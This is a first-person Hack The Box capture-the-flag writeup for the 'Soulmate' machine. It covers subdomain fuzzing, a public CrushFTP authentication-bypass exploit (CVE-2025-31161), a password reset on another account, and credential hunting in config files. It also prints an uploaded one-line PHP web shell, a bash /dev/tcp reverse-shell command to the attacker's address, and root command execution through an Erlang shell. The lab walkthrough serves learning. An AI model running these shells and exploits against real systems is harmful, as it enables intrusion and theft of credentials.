---
title: Hack The Box - Soulmate (2025) Writeup
date: 2025-09-15 18:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Soulmate
  - CrushFTP
  - CVE-2025-31161
  - Erlang
  - Port Forwarding
  - SSH Runner
---

# Soulmate (Hack The Box) - 2025

> "Sometimes the subdomain you almost filtered out is literally named **ftp**. Lesson learned."

---

## 1. Recon: Starting Off Wrong (As Usual)

Okay so I started with the basics. Added the IP to my hosts file:

```bash
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

Then ran my standard Nmap scan:

```bash
nmap -sV -A 10.10.11.86
```

Got this:
```
22/tcp   open  ssh     OpenSSH 8.9p1 (with a MOUNTAIN of CVEs)
80/tcp   open  http    nginx 1.18.0
```

I was like "Okay, SSH and a web server. Cool." I checked the web page first and it was just... nothing. Like literally nothing interesting. I ran dirsearch and found some auth pages like `/login.php`, `/register.php`, but everything just redirected to login and I couldn't figure out how to register or anything.

I spent like an hour trying to find SQL injection, checking for default credentials, looking at the page source for hidden comments... basically doing everything except the right thing.

---

## 2. Subdomain Fuzzing: The Moment I Almost Gave Up

So I was getting frustrated and decided to try subdomain enumeration. I busted out ffuf:

```bash
ffuf -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" \
     -w /snap/seclists/1078/Discovery/DNS/subdomains-top1million-5000.txt
```

And here's where I made my first mistake - I didn't filter the results properly. Every single subdomain was returning the same response size, so I couldn't tell which ones were actually different! I was scrolling through like 5000 results and they all looked the same.

I was about to give up when I realized I should filter by response size. So I added `-fw 4` to filter out the common response:

```bash
ffuf -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" \
     -w /snap/seclists/1078/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
```

And FINALLY I hit something:
- `ftp.soulmate.htb`

I was like "Wait, FTP? On a subdomain? That's weird." But I checked it out anyway.

---

## 3. CrushFTP: When I Had No Idea What I Was Looking At

Visiting `ftp.soulmate.htb` showed me a web login page. It looked like some kind of file management system, but I had NO idea what it was. The UI looked kinda old-school, and I was like "Is this some custom thing? Or is this a known software?"

I tried some basic stuff - default credentials, SQL injection (again, didn't work), checked the page source... nothing.

Then I googled "web ftp login page" and found out it was probably CrushFTP. I was like "Okay, cool, so what CVEs does CrushFTP have?"

A quick search turned up **CVE-2025-31161** – authentication bypass via path traversal. I was like "Wait, that sounds too good to be true." But I found a GitHub PoC from Immersive Labs and decided to try it.

---

## 4. The Exploit: When I Messed Up the Syntax (Again)

So I cloned the repo:

```bash
git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161
cd CVE-2025-31161
```

I read the README and was like "Okay, this should be straightforward." But then I tried running it and kept getting errors. I was like "Why isn't this working??"

I tried like 5 different ways:
- Wrong port
- Wrong host format
- Forgot the `--` flags
- Messed up the user/password format

Finally, after reading the help like 10 times, I got it right:

```bash
python3 CVE-2025-31161.py --target_host ftp.soulmate.htb \
  --port 80 --target_user root --new_user hyh --password admin123
```

And BOOM! It actually worked! I created my own user (`hyh` with password `admin123`). I was so hyped, you have no idea. I immediately logged into the CrushFTP panel.

---

## 5. Password Reset Shenanigans

Once I was in the admin panel, I was looking around and spotted there was a user called **ben**. I was like "Hmm, I wonder if I can do anything with this."

I noticed the UI had a password reset feature. I was like "Wait, can I just... reset his password?" So I tried it, and it actually worked! I reset ben's password to something I knew, logged out, and logged back in as ben.

I checked his file system view and found a directory that was being served by the web server. I was like "Perfect! I can upload a shell here."

---

## 6. Getting a Shell: The Reverse Shell Struggle

So I uploaded a PHP reverse shell:

```php
<?php system($_GET['cmd']); ?>
```

I had my netcat listener ready:

```bash
nc -lvnp 4444
```

Then I tried to trigger it with curl:

```bash
curl "http://ftp.soulmate.htb/uploads/shell.php?cmd=id"
```

It worked! I got command execution. But then I tried to get a reverse shell and kept messing up the syntax. I tried like 3 different ways before I got it right:

```bash
curl "http://ftp.soulmate.htb/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

Finally got a shell as `www-data`! I immediately upgraded it to a proper PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 7. Finding Credentials: The Config File Goldmine

So I'm poking around the file system, looking for anything interesting. I checked `/var/www/html` and found some CrushFTP config files. I was like "Maybe there's a password in here?"

I started grepping for "password" in config files:

```bash
grep -r "password" /var/www/html/
```

And I found it! The admin password was just sitting there in plaintext:

```
Crush4dmin990
```

I was like "This HAS to work for SSH, right?" So I tried SSH with it, but it didn't work. I was like "Okay, maybe it's just for the web panel." But I kept the credential anyway.

---

## 8. The Ben Hunt: Finding SSH Credentials

I kept digging through files, looking for anything that might give me SSH access. I noticed there was some weird Erlang stuff under `/usr/local/lib/erlang_login`, which I thought was strange but didn't know what to do with it yet.

I also saw ben's home directory, but couldn't access it yet. I was looking through logs and config files, and eventually found some logs that contained what looked like an SSH password:

```
H****************8
```

I was like "Wait, is this it?" So I tried SSH:

```bash
ssh ben@soulmate.htb
```

And when it asked for the password, I tried the one from the logs. And it WORKED! I was so relieved. I grabbed the user flag:

```bash
cat ~/user.txt
# Output: *********************
```

One down, one to go!

---

## 9. Privilege Escalation: When Nothing Made Sense

Now for the hard part - getting root. I started with the usual stuff:

```bash
find / -type f -perm -4000 -user root 2>/dev/null
```

Nothing interesting. Checked sudo:

```bash
sudo -l
```

Nothing. I was like "Okay, what else can I check?"

I listed processes to see what was running:

```bash
ps aux | grep root
```

And I saw something REALLY weird:

```
/usr/local/lib/erlang_login/start.escript ... -sname ssh_runner ...
```

I was like "What is this? Erlang? SSH runner? What does that even mean?"

I also noticed that port `2222` was listening. I was like "Wait, maybe I can SSH to that port?" So I tried:

```bash
ssh -p 2222 ben@soulmate.htb
```

---

## 10. Erlang Hell: When I Had No Idea What I Was Doing

So I SSH'd to port 2222, and instead of getting a normal bash shell, I landed in this... Erlang environment? It was like some custom `ssh_runner` thing. Definitely not bash.

I was like "What the heck is this? How do I even use this?"

I tried typing `help` and it actually worked! Then I tried some basic commands:

```erlang
help().
os:cmd("id").
```

And I saw that it was running as root! I was like "Wait, this is running as ROOT? And I can execute commands?"

I was so confused but also excited. I tried to navigate around, but the navigation was funky. I was like "How do I read files in Erlang?" I googled it and found out I could use `file:read_file()`.

So I tried:

```erlang
cd("/root").
file:read_file("root.txt").
```

And it worked! The output was:

```
{ok,<<"*********************">>}
```

I was like "YES! I got it!" I didn't even need to escape to bash - reading files directly from Erlang was enough.

---

## What I Learned (The Hard Way)

- **Don't ignore weird subdomain fuzzing responses** - Filtering was key, and I almost gave up before I found `ftp.soulmate.htb`
- **CrushFTP CVEs are wild** - Creating a new admin user felt almost unfair, but hey, it worked
- **Erlang shells are bizarre but powerful** - I had NO idea what I was doing, but `os:cmd/1` is your friend
- **Always dump config files** - People leave passwords everywhere, and I found like 3 different credentials just by grepping
- **Sometimes the weirdest things work** - I never thought I'd be using Erlang to get root, but here we are

This box took me forever because I kept going down wrong paths - trying SQL injection everywhere, not filtering subdomain results properly, messing up exploit syntax... but man, when I finally got root through that Erlang thing, I was so confused and excited at the same time.

> "Soulmate made me fall in love with Erlang. Kinda. Still have no idea how it works though."

---

*This writeup is for educational purposes only. Always hack responsibly.*

